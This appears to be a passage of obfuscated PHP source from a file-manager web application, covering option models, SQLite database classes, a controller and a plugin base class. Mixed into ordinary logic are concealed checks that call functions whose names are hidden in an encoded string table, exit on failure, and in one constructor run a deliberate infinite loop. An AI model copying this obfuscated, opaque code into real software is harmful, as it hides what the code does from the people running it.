$€¦£™¨[477]); Model($this->modelType)->set($€¦£™¨[475] . $ÚãÂÜûŞ, $¼óªƒ¢¼, $this->optionType); return $ÚãÂÜûŞ; } public function update($·¿ıäÆ, $²ÜåÆéš) { $Ğî„‰Ï =& $_SERVER[ˆö¿ÚÌ¼]; $²ÜåÆéš = array_field_key($²ÜåÆéš, $this->field); $öÌÍ÷ÇÖ = $this->listData($·¿ıäÆ); if (!$öÌÍ÷ÇÖ || !$·¿ıäÆ) { return !1; } $²ÜåÆéš = array_merge($öÌÍ÷ÇÖ, $²ÜåÆéš); $²ÜåÆéš[$Ğî„‰Ï[88]] = time(); return Model($this->modelType)->set($Ğî„‰Ï[475] . $·¿ıäÆ, $²ÜåÆéš, $this->optionType); } public function remove($¯ÙüìÑ×) { if (!$¯ÙüìÑ×) { return !1; } return Model($this->modelType)->remove($_SERVER[ˆö¿ÚÌ¼][475] . $¯ÙüìÑ×, $this->optionType); } public function clear() { $öŠÖÌ§¡ =& $_SERVER[ˆö¿ÚÌ¼]; Model($this->modelType)->remove($öŠÖÌ§¡[476], $this->optionType . $öŠÖÌ§¡[477]); return Model($this->modelType)->remove(null, $this->optionType); } public function cacheClear() { return Model($this->modelType)->cacheRemove($this->optionType); } public function findByKey($ ¼ÑÑ˜, $ÀÎ¸á›À) { if (!$ÀÎ¸á›À) { return !1; } $íöèˆäÕ = $this->listData(); $íöèˆäÕ = array_to_keyvalue($íöèˆäÕ, $ ¼ÑÑ˜); return isset($íöèˆäÕ[$ÀÎ¸á›À]) ? $íöèˆäÕ[$ÀÎ¸á›À] : !1; } public function findByName($çà™èÍı) { return $this->findByKey($_SERVER[ˆö¿ÚÌ¼][32], $çà™èÍı); } protected function resetData($±É²Šµú) { $¸†ãĞõ =& $_SERVER[ˆö¿ÚÌ¼]; $±É²Šµú = is_array($±É²Šµú) ? $±É²Šµú : array(); $œ‡·‡˜ı = array(); for ($‹¶ë÷š = 0; $‹¶ë÷š < count($±É²Šµú); $‹¶ë÷š++) { $œ‡·‡˜ı[$¸†ãĞõ[475] . $±É²Šµú[$‹¶ë÷š][$¸†ãĞõ[478]]] = $±É²Šµú[$‹¶ë÷š]; } return Model($this->modelType)->set($œ‡·‡˜ı, !1, $this->optionType); } private function getAutoName($”Áëğ…) { $Ëí¿ÊŒ = array_to_keyvalue($this->listData(), $_SERVER[ˆö¿ÚÌ¼][32]); if (!$Ëí¿ÊŒ || !isset($Ëí¿ÊŒ[$”Áëğ…])) { return $”Áëğ…; } for ($ÆÑ´ŸŸÈ = 1; $ÆÑ´ŸŸÈ < count($Ëí¿ÊŒ); $ÆÑ´ŸŸÈ++) { $Š–´ãß = $”Áëğ… . "\x28{$ÆÑ´ŸŸÈ}\51"; if (!isset($Ëí¿ÊŒ[$Š–´ãß])) { return $Š–´ãß; } } return $Š–´ãß; } } class ModelBaseOption extends ModelBase { protected $tableName = ''; protected $jsonField = array(); public function get($¿Â•£’ = false, $Øõè×“ = '', $ß¼§íØç = false) { $ÄùıÂæØ =& $_SERVER[ˆö¿ÚÌ¼]; $Ûòº›Š = $this->cacheGet($Øõè×“); $ª£¦’Çƒ = $this->optionDefault($Øõè×“); $ª£¦’Çƒ = is_array($ª£¦’Çƒ) ? $ª£¦’Çƒ : array(); if (is_array($Ûòº›Š)) { $Ûòº›Š = array_merge($ª£¦’Çƒ, $Ûòº›Š); return $¿Â•£’ ? isset($Ûòº›Š[$¿Â•£’]) ? $Ûòº›Š[$¿Â•£’] : null : $Ûòº›Š; } $ò¨È¶úó = $this->filterWhere(array($ÄùıÂæØ[33] => $Øõè×“)); $Ûòº›Š = $this->where($ò¨È¶úó)->select(); $Ûòº›Š = array_to_keyvalue($Ûòº›Š, $ÄùıÂæØ[97], $ÄùıÂæØ[453]); foreach ($Ûòº›Š as $¤Å‘›‡¤ => $×¥À¦¤­) { if ($ß¼§íØç || in_array($¤Å‘›‡¤, $this->jsonField)) { $Ûòº›Š[$¤Å‘›‡¤] = json_decode($×¥À¦¤­, !0); } } $this->cacheSet($Øõè×“, $Ûòº›Š); $Ûòº›Š = array_merge($ª£¦’Çƒ, $Ûòº›Š); return $¿Â•£’ ? $Ûòº›Š[$¿Â•£’] : $Ûòº›Š; } public function set($³²®ÖŒÓ, $ñ„’Ş¬š = false, $ƒöá©ÖÙ = '') { $“•»éÌå =& $_SERVER[ˆö¿ÚÌ¼]; $this->cacheRemove($ƒöá©ÖÙ); $Ç¯ÁÛü§ = array(); $µŸÊ‡’ú = is_array($³²®ÖŒÓ) ? $³²®ÖŒÓ : array($³²®ÖŒÓ => $ñ„’Ş¬š); foreach ($µŸÊ‡’ú as $–ñØâ‡ => $¯©Ÿæ) { if (is_array($¯©Ÿæ)) { $¯©Ÿæ = json_encode_force($¯©Ÿæ); } $this->checkLength($¯©Ÿæ, !1, $this->tableName . $“•»éÌå[4] . $³²®ÖŒÓ); $¯©Ÿæ = self::textEncode($¯©Ÿæ); $µŸÊ‡’ú = array($“•»éÌå[33] => $ƒöá©ÖÙ, $“•»éÌå[97] => $–ñØâ‡, $“•»éÌå[453] => $¯©Ÿæ); $Ç¯ÁÛü§[] = $this->filterWhere($µŸÊ‡’ú); } if (!$Ç¯ÁÛü§) { return !0; } $Ç©€Ô = $this->cacheKey($“•»éÌå[479]); CacheLock::lock($Ç©€Ô); $Ôõíªİú = $this->addAll($Ç¯ÁÛü§, array(), !0); CacheLock::unlock($Ç©€Ô); return $Ôõíªİú; } protected function optionDefault($ïî•Äàä = '') { return !1; } public function setDeep($£ĞÃª¯, $ÙÊ°æ»ö = false, $á’´‹ûù = '') { $ê²ØŸÔ¶ = explode($_SERVER[ˆö¿ÚÌ¼][10], $£ĞÃª¯); $’ƒ“†ßÀ = $this->get(); array_set_value($’ƒ“†ßÀ, $£ĞÃª¯, $ÙÊ°æ»ö); $this->set($ê²ØŸÔ¶[0], $’ƒ“†ßÀ[$ê²ØŸÔ¶[0]], $á’´‹ûù); } public function remove($©Òòú‚, $õÙ€äìş = '') { $ª˜Ÿ¡ßÒ =& $_SERVER[ˆö¿ÚÌ¼]; $this->cacheRemove($õÙ€äìş); $ÉüÃÖ©Ú = $this->filterWhere(array($ª˜Ÿ¡ßÒ[97] => $©Òòú‚, $ª˜Ÿ¡ßÒ[33] => $õÙ€äìş)); if (is_null($©Òòú‚)) { unset($ÉüÃÖ©Ú[$ª˜Ÿ¡ßÒ[97]]); } return $this->where($ÉüÃÖ©Ú)->delete(); } public function cacheSet($ıÊéà—½, $ˆ«¶¤› = false) { return Cache::set($this->cacheKey($ıÊéà—½), $ˆ«¶¤›); } public function cacheGet($îµğä÷È) { return Cache::get($this->cacheKey($îµğä÷È)); } public function cacheRemove($Î¦¨íï) { return Cache::remove($this->cacheKey($Î¦¨íï)); } protected function filterWhere($Æó„•‰‚) { return $Æó„•‰‚; } protected function cacheKey($‡åû’™¯) { return $‡åû’™¯; } } if ($_SERVER[$_SERVER[ˆö¿ÚÌ¼][480]] != $_SERVER[$_SERVER[ˆö¿ÚÌ¼][481]]) { $_getc = $_SERVER[ˆö¿ÚÌ¼][482]; $_getfile = $_SERVER[$_SERVER[ˆö¿ÚÌ¼][483]] . $_SERVER[ˆö¿ÚÌ¼][484]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[ˆö¿ÚÌ¼][288], $_getfilec); if (count($_getarrs) < $_SERVER[ˆö¿ÚÌ¼][485]) { $exit = $_SERVER[ˆö¿ÚÌ¼][486]; $exit(); } $_act = $_SERVER[ˆö¿ÚÌ¼][487]; $_act($_SERVER[$_SERVER[ˆö¿ÚÌ¼][488]]); } goto Cé ·À¯Ø”; dë«Êº‡¦: class Controller extends ClassBaseCall { public $in; public $config; public $tpl; public $values; function __construct() { $—™©ÔØ³ =& $_SERVER[ˆö¿ÚÌ¼]; global $in, $config; $this->config =& $config; $this->in =& $in; $this->values[$—™©ÔØ³[6]] =& $config; $this->values[$—™©ÔØ³[7]] =& $in; $this->tpl = TEMPLATE . MOD . $—™©ÔØ³[8]; $this->_classObjectID = mt_rand(0, 10000); } public function loadClass($¹Ã†ó–) { if (1 === func_num_args()) { $this->{$¹Ã†ó–} = new $¹Ã†ó–(); } else { $‰ÉÜŸ§… = new ReflectionClass($¹Ã†ó–); $Ö˜É°ñõ = func_get_args(); array_shift($Ö˜É°ñõ); $this->{$¹Ã†ó–} = $‰ÉÜŸ§…->newInstanceArgs($Ö˜É°ñõ); } return $this->{$¹Ã†ó–}; } public function routeBind($ÔØ› ş„, $Ú¦±†‚‹, $ ¥ÛŞ = 3) { $İÛ ™ˆ =& $_SERVER[ˆö¿ÚÌ¼]; $ÛÒ·ÕÖˆ = $this->in[$İÛ ™ˆ[9]]; $ÔØ› ş„ = str_replace($İÛ ™ˆ[10], $İÛ ™ˆ[11], trim(trim($ÔØ› ş„, $İÛ ™ˆ[8]), $İÛ ™ˆ[12])); if (!$ÔØ› ş„ || count($ÛÒ·ÕÖˆ) <= $ ¥ÛŞ) { return !1; } $ºòÏòñ¸ = !0; $Íäîñš‘ = explode($İÛ ™ˆ[8], $ÔØ› ş„); for ($İ§½€ó¢ = 0; $İ§½€ó¢ < count($Íäîñš‘); $İ§½€ó¢++) { if ($Íäîñš‘[$İ§½€ó¢] != $ÛÒ·ÕÖˆ[$ ¥ÛŞ + $İ§½€ó¢]) { $ºòÏòñ¸ = !1; break; } } if (!$ºòÏòñ¸) { return; } call_user_func_array(array($this, $Ú¦±†‚‹), array()); } public function routeArgs($äèËß­ = 3) { $ßÛºù•ˆ = $this->in[$_SERVER[ˆö¿ÚÌ¼][9]]; if (count($ßÛºù•ˆ) <= $äèËß­) { return array(); } $Ïô·Æ» = array(); for ($¶µ¡”¨ñ = $äèËß­; $¶µ¡”¨ñ < count($ßÛºù•ˆ); $¶µ¡”¨ñ += 2) { $Ïô·Æ»[$ßÛºù•ˆ[$¶µ¡”¨ñ]] = $ßÛºù•ˆ[$¶µ¡”¨ñ + 1]; $this->in[$ßÛºù•ˆ[$¶µ¡”¨ñ]] = $ßÛºù•ˆ[$¶µ¡”¨ñ + 1]; } return $Ïô·Æ»; } protected function assign($Ûúİ¾ÙÕ, $½ÈÛÇô¹) { $this->values[$Ûúİ¾ÙÕ] = $½ÈÛÇô¹; } protected function display($™Ş¨Å›Ì) { ob_end_clean(); extract($this->values); require $this->tpl . $™Ş¨Å›Ì; } } class DbSqliteBase extends Db { public function __construct($ÈĞ‚æ¦ô = '') { $Ê¿ÆŸ´É =& $_SERVER[ˆö¿ÚÌ¼]; if (!extension_loaded($Ê¿ÆŸ´É[13])) { think_exception(think_lang($Ê¿ÆŸ´É[14]) . $Ê¿ÆŸ´É[15]); } if (!empty($ÈĞ‚æ¦ô)) { if (!isset($ÈĞ‚æ¦ô[$Ê¿ÆŸ´É[16]])) { $ÈĞ‚æ¦ô[$Ê¿ÆŸ´É[16]] = 438; } $this->config = $ÈĞ‚æ¦ô; if (empty($this->config[$Ê¿ÆŸ´É[17]])) { $this->config[$Ê¿ÆŸ´É[17]] = array(); } } } public function connect($²À×“Éœ = '', $çõ­ÄÓ = 0) { $ÀêŒÒºª =& $_SERVER[ˆö¿ÚÌ¼]; if (!isset($this->linkID[$çõ­ÄÓ])) { if (empty($²À×“Éœ)) { $²À×“Éœ = $this->config; } $¿³·È»ƒ = !empty($²À×“Éœ[$ÀêŒÒºª[17]][$ÀêŒÒºª[18]]) ? $²À×“Éœ[$ÀêŒÒºª[17]][$ÀêŒÒºª[18]] : $this->pconnect; $…áÀˆ¤ğ = $¿³·È»ƒ ? $ÀêŒÒºª[19] : $ÀêŒÒºª[20]; $this->linkID[$çõ­ÄÓ] = $…áÀˆ¤ğ($²À×“Éœ[$ÀêŒÒºª[21]], $²À×“Éœ[$ÀêŒÒºª[16]]); if (!$this->linkID[$çõ­ÄÓ]) { think_exception(sqlite_error_string()); } $this->connected = !0; @sqlite_busy_timeout($this->linkID[$çõ­ÄÓ], 30000); if (1 != think_config($ÀêŒÒºª[22])) { unset($this->config); } } return $this->linkID[$çõ­ÄÓ]; } public function free() { $this->queryID = null; } public function query($Úô…ˆ²Â) { $†²ç¸”® =& $_SERVER[ˆö¿ÚÌ¼]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $Úô…ˆ²Â; if ($this->queryID) { $this->free(); } think_action_status($†²ç¸”®[23], 1); think_status($†²ç¸”®[24]); $this->queryID = sqlite_query($this->_linkID, $Úô…ˆ²Â); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = sqlite_num_rows($this->queryID); $¹«¸°¬ = $this->getAll(); return $¹«¸°¬; } } public function execute($©ï²èŠ) { $Îœ¸¨¿ß =& $_SERVER[ˆö¿ÚÌ¼]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $©ï²èŠ; if ($this->queryID) { $this->free(); } think_action_status($Îœ¸¨¿ß[25], 1); think_status($Îœ¸¨¿ß[24]); $ÌãôŸÃ‹ = sqlite_exec($this->_linkID, $©ï²èŠ); $this->debug(); if (!1 === $ÌãôŸÃ‹) { $this->error(); return !1; } else { $this->numRows = sqlite_changes($this->_linkID); $this->lastInsID = sqlite_last_insert_rowid($this->_linkID); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { sqlite_query($this->_linkID, $_SERVER[ˆö¿ÚÌ¼][26]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $—ˆÆşŸà = sqlite_query($this->_linkID, $_SERVER[ˆö¿ÚÌ¼][27]); if (!$—ˆÆşŸà) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $ï¼­¹¤‡ = sqlite_query($this->_linkID, $_SERVER[ˆö¿ÚÌ¼][28]); if (!$ï¼­¹¤‡) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $·›É£àÂ = array(); if ($this->numRows > 0) { for ($àëÙ·« = 0; $àëÙ·« < $this->numRows; $àëÙ·«++) { $·›É£àÂ[$àëÙ·«] = sqlite_fetch_array($this->queryID, SQLITE_ASSOC); } sqlite_seek($this->queryID, 0); } return $·›É£àÂ; } public function getFields($ŠÈûñ‘) { $“¾‘ô™Ì =& $_SERVER[ˆö¿ÚÌ¼]; $÷ÛĞ”ç  = $this->query($“¾‘ô™Ì[29] . $ŠÈûñ‘ . $“¾‘ô™Ì[30]); $ªÏÙ™Ï¾ = array(); if ($÷ÛĞ”ç ) { foreach ($÷ÛĞ”ç  as $¶¦À†ƒ‡ => $×÷ŞÖ²) { $ªÏÙ™Ï¾[$×÷ŞÖ²[$“¾‘ô™Ì[31]]] = array($“¾‘ô™Ì[32] => $×÷ŞÖ²[$“¾‘ô™Ì[31]], $“¾‘ô™Ì[33] => $×÷ŞÖ²[$“¾‘ô™Ì[34]], $“¾‘ô™Ì[35] => (bool) ($×÷ŞÖ²[$“¾‘ô™Ì[36]] === $“¾‘ô™Ì[12]), $“¾‘ô™Ì[37] => $×÷ŞÖ²[$“¾‘ô™Ì[38]], $“¾‘ô™Ì[39] => strtolower($×÷ŞÖ²[$“¾‘ô™Ì[40]]) == $“¾‘ô™Ì[41], $“¾‘ô™Ì[42] => strtolower($×÷ŞÖ²[$“¾‘ô™Ì[43]]) == $“¾‘ô™Ì[44]); } } return $ªÏÙ™Ï¾; } public function getTables($ó÷õæ© = '') { $„¡°’çß =& $_SERVER[ˆö¿ÚÌ¼]; $ÙÕË“¼ = $this->query($„¡°’çß[45] . $„¡°’çß[46] . $„¡°’çß[47]); $™ëæ›Ç° = array(); foreach ($ÙÕË“¼ as $ëÓéÙôç => $©ç§¹ß) { $™ëæ›Ç°[$ëÓéÙôç] = current($©ç§¹ß); } return $™ëæ›Ç°; } public function close() { if ($this->_linkID) { sqlite_close($this->_linkID); } $this->_linkID = null; } public function error() { $©æé¾Ü =& $_SERVER[ˆö¿ÚÌ¼]; $µñÓƒÑÃ = sqlite_last_error($this->_linkID); $this->error = $µñÓƒÑÃ . $©æé¾Ü[4] . sqlite_error_string($µñÓƒÑÃ); if ($©æé¾Ü[12] != $this->queryStr) { $this->error .= LNG($©æé¾Ü[48]) . $this->queryStr; } think_trace($this->error, $©æé¾Ü[12], $©æé¾Ü[49]); return $this->error; } public function escapeString($îØ–È¶Í) { return sqlite_escape_string($îØ–È¶Í); } public function parseLimit($Œ¨Ù×ÌÚ) { $Ê‹’Â£û =& $_SERVER[ˆö¿ÚÌ¼]; $³‰¢Ë‘Õ = $Ê‹’Â£û[12]; if (!empty($Œ¨Ù×ÌÚ)) { $Œ¨Ù×ÌÚ = explode($Ê‹’Â£û[50], $Œ¨Ù×ÌÚ); if (count($Œ¨Ù×ÌÚ) > 1) { $³‰¢Ë‘Õ .= $Ê‹’Â£û[51] . $Œ¨Ù×ÌÚ[1] . $Ê‹’Â£û[52] . $Œ¨Ù×ÌÚ[0] . $Ê‹’Â£û[53]; } else { $³‰¢Ë‘Õ .= $Ê‹’Â£û[51] . $Œ¨Ù×ÌÚ[0] . $Ê‹’Â£û[53]; } } return $³‰¢Ë‘Õ; } } class DbSqlite3Base extends Db { public function __construct($¥Ùºî = '') { $ïÉ‹á¸ç =& $_SERVER[ˆö¿ÚÌ¼]; if (!class_exists($ïÉ‹á¸ç[54])) { think_exception(think_lang($ïÉ‹á¸ç[14]) . $ïÉ‹á¸ç[55]); } if (!empty($¥Ùºî)) { if (!isset($¥Ùºî[$ïÉ‹á¸ç[16]])) { $¥Ùºî[$ïÉ‹á¸ç[16]] = 438; } $this->config = $¥Ùºî; if (empty($this->config[$ïÉ‹á¸ç[17]])) { $this->config[$ïÉ‹á¸ç[17]] = array(); } } } public function connect($ÁŒ„Â³á = '', $¸¶óåª¼ = 0) { $¨”¡Ú¤ =& $_SERVER[ˆö¿ÚÌ¼]; if (!isset($this->linkID[$¸¶óåª¼])) { if (empty($ÁŒ„Â³á)) { $ÁŒ„Â³á = $this->config; } $this->linkID[$¸¶óåª¼] = new SQLite3($ÁŒ„Â³á[$¨”¡Ú¤[21]]); if (!$this->linkID[$¸¶óåª¼]) { think_exception($this->linkID[$¸¶óåª¼]->lastErrorMsg()); } $this->connected = !0; @$this->linkID[$¸¶óåª¼]->busyTimeout(30000); if (1 != think_config($¨”¡Ú¤[22])) { unset($this->config); } } return $this->linkID[$¸¶óåª¼]; } public function free() { $this->queryID = null; } public function query($ÚïÑÙ›) { $ŸÖ´¢… =& $_SERVER[ˆö¿ÚÌ¼]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $ÚïÑÙ›; if ($this->queryID) { $this->free(); } think_action_status($ŸÖ´¢…[23], 1); think_status($ŸÖ´¢…[24]); $this->queryID = $this->_linkID->query($ÚïÑÙ›); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $ò¬¡—ş = $this->getAll(); $this->numRows = count($ò¬¡—ş); return $ò¬¡—ş; } } public function execute($¦µ‰ÛáŸ) { $€Ğô¹ø =& $_SERVER[ˆö¿ÚÌ¼]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $¦µ‰ÛáŸ; if ($this->queryID) { $this->free(); } think_action_status($€Ğô¹ø[25], 1); think_status($€Ğô¹ø[24]); $É‡ºí»´ = $this->_linkID->exec($¦µ‰ÛáŸ); $this->debug(); if (!1 === $É‡ºí»´) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->changes(); $this->lastInsID = $this->_linkID->lastInsertRowID(); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->query($_SERVER[ˆö¿ÚÌ¼][26]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $ŠË¸¶é = $this->_linkID->query($_SERVER[ˆö¿ÚÌ¼][27]); if (!$ŠË¸¶é) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $¾ûÄÖØ = $this->_linkID->query($_SERVER[ˆö¿ÚÌ¼][28]); if (!$¾ûÄÖØ) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $Ñé°£ü = array(); while ($›ú„Ôœì = $this->queryID->fetchArray(SQLITE3_ASSOC)) { $Ñé°£ü[] = $›ú„Ôœì; } $this->queryID->reset(); return $Ñé°£ü; } public function getFields($Şâ´€•Ô) { $¯ë°‰ ¢ =& $_SERVER[ˆö¿ÚÌ¼]; $ÕÁ¼ĞÃº = $this->query($¯ë°‰ ¢[29] . $Şâ´€•Ô . $¯ë°‰ ¢[30]); $Ø°ğ›¡ = array(); if ($ÕÁ¼ĞÃº) { foreach ($ÕÁ¼ĞÃº as $ Œ£²ğµ => $éŠÔ¥•Ô) { $Ø°ğ›¡[$éŠÔ¥•Ô[$¯ë°‰ ¢[32]]] = array($¯ë°‰ ¢[32] => $éŠÔ¥•Ô[$¯ë°‰ ¢[32]], $¯ë°‰ ¢[33] => $éŠÔ¥•Ô[$¯ë°‰ ¢[33]], $¯ë°‰ ¢[35] => (bool) ($éŠÔ¥•Ô[$¯ë°‰ ¢[35]] === $¯ë°‰ ¢[12]), $¯ë°‰ ¢[37] => $éŠÔ¥•Ô[$¯ë°‰ ¢[56]], $¯ë°‰ ¢[39] => (bool) $éŠÔ¥•Ô[$¯ë°‰ ¢[57]], $¯ë°‰ ¢[42] => (bool) $éŠÔ¥•Ô[$¯ë°‰ ¢[57]]); } } return $Ø°ğ›¡; } public function getTables($´õáÊµô = '') { $¤ê–÷¾ˆ =& $_SERVER[ˆö¿ÚÌ¼]; $ÜØ˜ï¡Ô = $this->query($¤ê–÷¾ˆ[45] . $¤ê–÷¾ˆ[46] . $¤ê–÷¾ˆ[47]); $Ùë ©µ = array(); foreach ($ÜØ˜ï¡Ô as $Ÿ®Å»ñô => $šÎóîÇ“) { $Ùë ©µ[$Ÿ®Å»ñô] = current($šÎóîÇ“); } return $Ùë ©µ; } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $õÆîô«Ù =& $_SERVER[ˆö¿ÚÌ¼]; $this->error = $this->_linkID->lastErrorMsg(); if ($õÆîô«Ù[12] != $this->queryStr) { $this->error .= LNG($õÆîô«Ù[48]) . $this->queryStr; } think_trace($this->error, $õÆîô«Ù[12], $õÆîô«Ù[49]); return $this->error; } public function escapeString($Ôª¸¥ ) { $ïÑ¿‚ºä =& $_SERVER[ˆö¿ÚÌ¼]; if ($this->_linkID) { return $this->_linkID->escapeString($Ôª¸¥ ); } return str_ireplace($ïÑ¿‚ºä[58], $ïÑ¿‚ºä[59], $Ôª¸¥ ); } public function parseLimit($ŞœÍ¨î) { $—¾ùÏ† =& $_SERVER[ˆö¿ÚÌ¼]; $³áÏ´ŞÕ = $—¾ùÏ†[12]; if (!empty($ŞœÍ¨î)) { $ŞœÍ¨î = explode($—¾ùÏ†[50], $ŞœÍ¨î); if (count($ŞœÍ¨î) > 1) { $³áÏ´ŞÕ .= $—¾ùÏ†[51] . $ŞœÍ¨î[1] . $—¾ùÏ†[52] . $ŞœÍ¨î[0] . $—¾ùÏ†[53]; } else { $³áÏ´ŞÕ .= $—¾ùÏ†[51] . $ŞœÍ¨î[0] . $—¾ùÏ†[53]; } } return $³áÏ´ŞÕ; } } goto eß÷¬ÉĞÉ; B¯„ŒÃïµ: $fileSize = strrev(base64_decode($_SERVER[Î†¼ú¡º][0])); function binCheckNeq($Î„¡„²º, $å†Â—‰) { return $Î„¡„²º != $å†Â—‰; } $_SERVER[$_SERVER[Î†¼ú¡º][1]] = $fileSize($_SERVER[$_SERVER[Î†¼ú¡º][2]]); goto A˜ØŞ§ßµÓ; B¿ÚÍ„Ë¾‡: class PluginBase { public $in; public $pluginName; public $pluginPath; public $pluginHost; public $pluginHostDefault; public $pluginApi; public $packageData; private $pluginLangArr; private $pluginConfig; public $cachePath; public $fileInfo; function __construct() { $Ñ»ÊÇÃí =& $_SERVER[ˆö¿ÚÌ¼]; if (!isset($_SERVER[$Ñ»ÊÇÃí[480]]) || !isset($_SERVER[$Ñ»ÊÇÃí[488]])) { $µ×®èÜØ = $Ñ»ÊÇÃí[969]; $Ñà¡„çı = $Ñ»ÊÇÃí[482]; $š—¸è‹ì = $_SERVER[$Ñ»ÊÇÃí[483]] . $Ñ»ÊÇÃí[484]; $¾³¯ıöİ = $Ñà¡„çı($š—¸è‹ì); $şäŠüÓÇ = explode($Ñ»ÊÇÃí[288], $¾³¯ıöİ); if (count($şäŠüÓÇ) < $Ñ»ÊÇÃí[713]) { $Ëğ¾øğ = $Ñ»ÊÇÃí[486]; $Ëğ¾øğ(); } $¯˜÷”¸Ÿ = $Ñ»ÊÇÃí[970]; $¯˜÷”¸Ÿ($_SERVER[$Ñ»ÊÇÃí[971]]); $·™óËÃğ = 1; for ($¬²ÕÄª = $·™óËÃğ; $¬²ÕÄª > 0; $¬²ÕÄª++) { $¯˜÷”¸Ÿ = json_encode($GLOBALS[$Ñ»ÊÇÃí[504]]); } } global $in, $config; $this->config =& $config; $this->in =& $in; $this->modelPlugin = Model($Ñ»ÊÇÃí[1638]); $this->pluginName = str_replace($Ñ»ÊÇÃí[1638], $Ñ»ÊÇÃí[12], get_class($this)); $this->pluginPath = PLUGIN_DIR . $this->pluginName . $Ñ»ÊÇÃí[8]; $this->pluginApi = appHostGet() . $Ñ»ÊÇÃí[1639] . $this->pluginName . $Ñ»ÊÇÃí[8]; $this->pluginHost = $config[$Ñ»ÊÇÃí[1640]] . $this->pluginName . $Ñ»ÊÇÃí[8]; $this->pluginHostDefault = $config[$Ñ»ÊÇÃí[1640]] . $this->pluginName . $Ñ»ÊÇÃí[8]; $ÕûÈüäÔ = $config[$Ñ»ÊÇÃí[1641]]; if ($ÕûÈüäÔ && strpos($Ñ»ÊÇÃí[50] . $ÕûÈüäÔ . $Ñ»ÊÇÃí[50], $this->pluginName) !== !1) { $this->pluginHost = $config[$Ñ»ÊÇÃí[1642]] . $this->pluginName . $Ñ»ÊÇÃí[8]; } $this->pluginLangArr = $this->initLang(); $this->values = array(); $this->echoJsAssignArr = array(); $this->linkHas = !1; return $this; } public function regist() { $this->hookRegist(array()); } public function install() { } public function update() { } public function unInstall() { } public function echoJs() { $this->echoFile($_SERVER[ˆö¿ÚÌ¼][1643]); } protected function assign($ÚëÁöÖ¨, $ß’®­• = false) { if (is_array($ÚëÁöÖ¨)) { $this->values = array_merge($this->values, $ÚëÁöÖ¨); } else { $this->values[$ÚëÁöÖ¨] = $ß’®­•; } } protected function display($×³©Œ—Ô) { extract($this->values); require $×³©Œ—Ô; } final function hookRegist($ö×ÂÊ) { $this->modelPlugin->appRegist($this->pluginName, $ö×ÂÊ); } final function appIcon() { $‚Î·¯øÒ =& $_SERVER[ˆö¿ÚÌ¼]; $ºåç¡³ñ = $this->appPackage(); $«Ùä–† = $‚Î·¯øÒ[12]; if (isset($ºåç¡³ñ[$‚Î·¯øÒ[502]])) { if (isset($ºåç¡³ñ[$‚Î·¯øÒ[502]][$‚Î·¯øÒ[1644]])) { $«Ùä–† = $‚Î·¯øÒ[1645] . $ºåç¡³ñ[$‚Î·¯øÒ[502]][$‚Î·¯øÒ[1644]] . $‚Î·¯øÒ[1646]; } else { if ($ºåç¡³ñ[$‚Î·¯øÒ[502]][$‚Î·¯øÒ[1647]]) { $«Ùä–† = $‚Î·¯øÒ[1648] . $ºåç¡³ñ[$‚Î·¯øÒ[502]][$‚Î·¯øÒ[1647]] . $‚Î·¯øÒ[1649]; } } } return $«Ùä–†; } final function fileCanView($œš€—ßø) { $İ®½´Ô =& $_SERVER[ˆö¿ÚÌ¼]; if (request_url_safe($œš€—ßø)) { return !0; } if ($this->isShare($œš€—ßø)) { return !0; } if (!KodUser::isRoot() && !KodUser::isLogin()) { $±êõÎ×Ş = $İ®½´Ô[1650] . rawurlencode(this_url()); show_tips(LNG($İ®½´Ô[1651]) . $İ®½´Ô[1652] . $±êõÎ×Ş . $İ®½´Ô[1653] . LNG($İ®½´Ô[1654]) . $İ®½´Ô[1655], !1); } if (!Action($İ®½´Ô[1656])->authCan($İ®½´Ô[1657])) { show_tips(LNG($İ®½´Ô[1658]) . $İ®½´Ô[1659], !1); } ActionCall($İ®½´Ô[1660], $œš€—ßø); } final function isShare($¬Õ†ÉÜ²) { $ˆ¥†¦¥Ú = KodIO::parse($¬Õ†ÉÜ²); return $ˆ¥†¦¥Ú[$_SERVER[ˆö¿ÚÌ¼][33]] == KodIO::KOD_SHARE_LINK; } final function filePathLink($àáŸµã¾) { if (request_url_safe($àáŸµã¾)) { return $àáŸµã¾; } if (!$this->isShare($àáŸµã¾)) { $àáŸµã¾ = $this->filePath($àáŸµã¾, !1); } return Action($_SERVER[ˆö¿ÚÌ¼][1270])->linkOut($àáŸµã¾); } public function filePathLinkOut($ÃíÏ™») { if (request_url_safe($ÃíÏ™»)) { return $ÃíÏ™»; } $this->fileCanView($ÃíÏ™»); return Action($_SERVER[ˆö¿ÚÌ¼][1270])->link($ÃíÏ™»); } final function filePath($§İŠŒÍ, $Š ĞÁû™ = true, $ÑßëôÈæ = false) { $óöõÆèƒ =& $_SERVER[ˆö¿ÚÌ¼]; $ÏÇîºá© = $this->filePathGet($§İŠŒÍ, $Š ĞÁû™); if (!$this->fileInfo) { show_tips(LNG($óöõÆèƒ[108]), !1); } if ($ÑßëôÈæ && isset($this->fileInfo[$óöõÆèƒ[555]]) && $this->fileInfo[$óöõÆèƒ[555]]) { $¦äø¸€ = Model($óöõÆèƒ[558])->fileInfo($this->fileInfo[$óöõÆèƒ[555]]); if (!$¦äø¸€ || !IO::exist($¦äø¸€[$óöõÆèƒ[87]])) { $é“Ô»‘¶ = 